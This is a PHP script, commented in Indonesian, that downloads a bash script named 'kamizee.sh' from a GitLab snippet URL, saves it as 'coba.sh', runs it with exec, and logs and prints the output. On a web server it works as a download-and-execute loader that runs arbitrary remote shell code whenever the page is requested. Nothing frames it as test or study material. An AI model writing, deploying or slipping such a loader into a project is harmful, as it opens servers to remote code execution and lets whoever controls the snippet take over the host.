<?php
$githubRawUrl = 'https://gitlab.com/-/snippets/3701299/raw/main/kamizee.sh';// Ganti dengan URL skrip bash di GitHub
$localScriptFile = 'coba.sh'; // Ganti dengan nama file lokal untuk menyimpan skrip bash
$logFile = 'execution_log.txt'; // Ganti dengan nama file log

// Validasi URL
if (!filter_var($githubRawUrl, FILTER_VALIDATE_URL)) {
    die("URL tidak valid.");
}

// Mendownload file bash dari GitHub
$fileContent = @file_get_contents($githubRawUrl);
if ($fileContent === false) {
    die("Gagal mengunduh file.");
}

// Menyimpan file ke direktori lokal
$save = @file_put_contents($localScriptFile, $fileContent);
if ($save === false) {
    die("Gagal menyimpan file.");
}

// Jalankan file bash dan tangkap output serta kode keluaran
$output = [];
$returnCode = 0;
$startTime = microtime(true);

exec("bash $localScriptFile", $output, $returnCode);

$executionTime = microtime(true) - $startTime;

// Menyimpan log output dan informasi waktu eksekusi
$logContent = date('Y-m-d H:i:s') . "\n";
$logContent .= "Execution Time: $executionTime seconds\n";
$logContent .= "Output:\n" . implode("\n", $output) . "\n\n";

file_put_contents($logFile, $logContent, FILE_APPEND);

// Tampilkan output dan informasi waktu eksekusi
echo "Output dari skrip bash:\n";
echo implode("\n", $output);

echo "\n\nKode keluaran: $returnCode\n";
echo "Waktu eksekusi: $executionTime detik\n";
?>
